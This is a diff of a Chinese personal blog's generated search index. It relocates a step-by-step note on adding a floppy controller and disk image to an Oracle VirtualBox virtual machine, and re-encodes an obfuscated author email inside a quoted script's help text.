-<p>再点击刚刚创建的虚拟机的设置</p>
-<img src="/2022/06/19/%E5%85%B3%E4%BA%8EOracle%20VM%20VirtualBox%E5%A6%82%E4%BD%95%E4%BD%BF%E7%94%A8%E8%BD%AF%E9%A9%B1%E7%9A%84%E9%97%AE%E9%A2%98/wps11.jpg" class="" title="img"> 
-
-<p>点击储存</p>
-<img src="/2022/06/19/%E5%85%B3%E4%BA%8EOracle%20VM%20VirtualBox%E5%A6%82%E4%BD%95%E4%BD%BF%E7%94%A8%E8%BD%AF%E9%A9%B1%E7%9A%84%E9%97%AE%E9%A2%98/wps12.jpg" class="" title="img"> 
-
-<p>点击左下方的加号</p>
-<img src="/2022/06/19/%E5%85%B3%E4%BA%8EOracle%20VM%20VirtualBox%E5%A6%82%E4%BD%95%E4%BD%BF%E7%94%A8%E8%BD%AF%E9%A9%B1%E7%9A%84%E9%97%AE%E9%A2%98/wps13.jpg" class="" title="img"> 
-
-<p>点击软盘，它就会多出了一个控制器</p>
-<img src="/2022/06/19/%E5%85%B3%E4%BA%8EOracle%20VM%20VirtualBox%E5%A6%82%E4%BD%95%E4%BD%BF%E7%94%A8%E8%BD%AF%E9%A9%B1%E7%9A%84%E9%97%AE%E9%A2%98/wps14.jpg" class="" title="img"> 
-
-<p>点击右方加号</p>
-<img src="/2022/06/19/%E5%85%B3%E4%BA%8EOracle%20VM%20VirtualBox%E5%A6%82%E4%BD%95%E4%BD%BF%E7%94%A8%E8%BD%AF%E9%A9%B1%E7%9A%84%E9%97%AE%E9%A2%98/wps15.jpg" class="" title="img"> 
-
-<p>点击注册</p>
-<img src="/2022/06/19/%E5%85%B3%E4%BA%8EOracle%20VM%20VirtualBox%E5%A6%82%E4%BD%95%E4%BD%BF%E7%94%A8%E8%BD%AF%E9%A9%B1%E7%9A%84%E9%97%AE%E9%A2%98/wps16.jpg" class="" title="img"> 
-
-<p>将自己的软盘放进去，点击ok保存就好</p>
-<img src="/2022/06/19/%E5%85%B3%E4%BA%8EOracle%20VM%20VirtualBox%E5%A6%82%E4%BD%95%E4%BD%BF%E7%94%A8%E8%BD%AF%E9%A9%B1%E7%9A%84%E9%97%AE%E9%A2%98/wps17.jpg" class="" title="img"> 
-
-<p>最后将虚拟机启动就可以了</p>
-]]></content>
-      <categories>
-        <category>笔记</category>
-        <category>其它笔记</category>
-      </categories>
-      <tags>
-        <tag>其它</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>关于TCP与UDP协议的学习</title>
     <url>/2022/06/19/%E5%85%B3%E4%BA%8ETCP%E4%B8%8EUDP%E5%8D%8F%E8%AE%AE%E7%9A%84%E5%AD%A6%E4%B9%A0/</url>
     <content><![CDATA[<p>TCP协议的**<em>*<em>三次握手，传输确认，四次挥手*</em>*</em>*</p>
@@ -2117,7 +2069,7 @@
 <p>​    print(“     To use this python script , you must install the tshark first.”)</p>
 <p>​    print(“     You can use <code>sudo apt-get install tshark</code> to install it”)</p>
 <p>​    print(“Author : “)</p>
-<p>​    print(“     WangYihang <a href="mailto:&#x77;&#x61;&#110;&#103;&#121;&#x69;&#x68;&#97;&#110;&#103;&#x65;&#114;&#64;&#x67;&#x6d;&#x61;&#x69;&#x6c;&#46;&#99;&#x6f;&#x6d;">&#x77;&#x61;&#110;&#103;&#121;&#x69;&#x68;&#97;&#110;&#103;&#x65;&#114;&#64;&#x67;&#x6d;&#x61;&#x69;&#x6c;&#46;&#99;&#x6f;&#x6d;</a>“)</p>
+<p>​    print(“     WangYihang <a href="mailto:&#119;&#x61;&#x6e;&#103;&#x79;&#x69;&#x68;&#x61;&#110;&#103;&#101;&#114;&#64;&#x67;&#x6d;&#97;&#105;&#108;&#46;&#99;&#x6f;&#109;">&#119;&#x61;&#x6e;&#103;&#x79;&#x69;&#x68;&#x61;&#110;&#103;&#101;&#114;&#64;&#x67;&#x6d;&#97;&#105;&#108;&#46;&#99;&#x6f;&#109;</a>“)</p>
 <p>​    print(“     If you have any questions , please contact me by email.”)</p>
 <p>​    print(“     Thank you for using.”)</p>
 <p>​    exit(1)</p>
@@ -2206,6 +2158,54 @@
       </categories>
       <tags>
         <tag>misc</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>关于Oracle VM VirtualBox如何使用软驱的问题</title>
+    <url>/2022/06/19/%E5%85%B3%E4%BA%8EOracle%20VM%20VirtualBox%E5%A6%82%E4%BD%95%E4%BD%BF%E7%94%A8%E8%BD%AF%E9%A9%B1%E7%9A%84%E9%97%AE%E9%A2%98/</url>
+    <content><![CDATA[<p>近期做到了一道题目，里面需要用到在虚拟机上挂载软盘的知识，查阅了一些资料，在这里进行一个总结。</p>
+<p>首先打开虚拟机，选择新建</p>
+<img src="/2022/06/19/%E5%85%B3%E4%BA%8EOracle%20VM%20VirtualBox%E5%A6%82%E4%BD%95%E4%BD%BF%E7%94%A8%E8%BD%AF%E9%A9%B1%E7%9A%84%E9%97%AE%E9%A2%98/wps7.jpg" class="" title="img"> 
+
+<p>在这里经过一些尝试，发现必须指定好系统的类型和版本，点击下一步，内存大小自定义，再下一步</p>
+<img src="/2022/06/19/%E5%85%B3%E4%BA%8EOracle%20VM%20VirtualBox%E5%A6%82%E4%BD%95%E4%BD%BF%E7%94%A8%E8%BD%AF%E9%A9%B1%E7%9A%84%E9%97%AE%E9%A2%98/wps8.jpg" class="" title="img"> 
+
+<p>在这里需要创建虚拟硬盘，下一步</p>
+<img src="/2022/06/19/%E5%85%B3%E4%BA%8EOracle%20VM%20VirtualBox%E5%A6%82%E4%BD%95%E4%BD%BF%E7%94%A8%E8%BD%AF%E9%A9%B1%E7%9A%84%E9%97%AE%E9%A2%98/wps9.jpg" class="" title="img"> 
+
+<p>直接下一步</p>
+<img src="/2022/06/19/%E5%85%B3%E4%BA%8EOracle%20VM%20VirtualBox%E5%A6%82%E4%BD%95%E4%BD%BF%E7%94%A8%E8%BD%AF%E9%A9%B1%E7%9A%84%E9%97%AE%E9%A2%98/wps10.jpg" class="" title="img"> 
+
+<p>给固定大小就行，下一步的文件位置和大小自定义，这样就创建好了</p>
+<p>再点击刚刚创建的虚拟机的设置</p>
+<img src="/2022/06/19/%E5%85%B3%E4%BA%8EOracle%20VM%20VirtualBox%E5%A6%82%E4%BD%95%E4%BD%BF%E7%94%A8%E8%BD%AF%E9%A9%B1%E7%9A%84%E9%97%AE%E9%A2%98/wps11.jpg" class="" title="img"> 
+
+<p>点击储存</p>
+<img src="/2022/06/19/%E5%85%B3%E4%BA%8EOracle%20VM%20VirtualBox%E5%A6%82%E4%BD%95%E4%BD%BF%E7%94%A8%E8%BD%AF%E9%A9%B1%E7%9A%84%E9%97%AE%E9%A2%98/wps12.jpg" class="" title="img"> 
+
+<p>点击左下方的加号</p>
+<img src="/2022/06/19/%E5%85%B3%E4%BA%8EOracle%20VM%20VirtualBox%E5%A6%82%E4%BD%95%E4%BD%BF%E7%94%A8%E8%BD%AF%E9%A9%B1%E7%9A%84%E9%97%AE%E9%A2%98/wps13.jpg" class="" title="img"> 
+
+<p>点击软盘，它就会多出了一个控制器</p>
+<img src="/2022/06/19/%E5%85%B3%E4%BA%8EOracle%20VM%20VirtualBox%E5%A6%82%E4%BD%95%E4%BD%BF%E7%94%A8%E8%BD%AF%E9%A9%B1%E7%9A%84%E9%97%AE%E9%A2%98/wps14.jpg" class="" title="img"> 
+
+<p>点击右方加号</p>
+<img src="/2022/06/19/%E5%85%B3%E4%BA%8EOracle%20VM%20VirtualBox%E5%A6%82%E4%BD%95%E4%BD%BF%E7%94%A8%E8%BD%AF%E9%A9%B1%E7%9A%84%E9%97%AE%E9%A2%98/wps15.jpg" class="" title="img"> 
+
+<p>点击注册</p>
+<img src="/2022/06/19/%E5%85%B3%E4%BA%8EOracle%20VM%20VirtualBox%E5%A6%82%E4%BD%95%E4%BD%BF%E7%94%A8%E8%BD%AF%E9%A9%B1%E7%9A%84%E9%97%AE%E9%A2%98/wps16.jpg" class="" title="img"> 
+
+<p>将自己的软盘放进去，点击ok保存就好</p>
+<img src="/2022/06/19/%E5%85%B3%E4%BA%8EOracle%20VM%20VirtualBox%E5%A6%82%E4%BD%95%E4%BD%BF%E7%94%A8%E8%BD%AF%E9%A9%B1%E7%9A%84%E9%97%AE%E9%A2%98/wps17.jpg" class="" title="img"> 
+
+<p>最后将虚拟机启动就可以了</p>
+]]></content>
+      <categories>
+        <category>笔记</category>
+        <category>其它笔记</category>
+      </categories>
+      <tags>
+        <tag>其它</tag>
       </tags>
   </entry>
   <entry>
